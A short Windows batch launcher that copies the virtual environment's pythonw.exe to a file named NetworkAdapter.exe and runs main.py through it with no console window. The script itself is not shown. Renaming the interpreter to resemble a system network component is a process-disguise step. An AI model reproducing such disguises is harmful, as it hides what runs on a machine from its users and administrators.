@echo off
cd /d "%~dp0"
if exist "venv\Scripts\pythonw.exe" (
    if not exist "venv\Scripts\NetworkAdapter.exe" (
        copy /y "venv\Scripts\pythonw.exe" "venv\Scripts\NetworkAdapter.exe" >nul 2>&1
    )
    start "" "venv\Scripts\NetworkAdapter.exe" main.py
) else (
    start "" pythonw main.py
)
exit
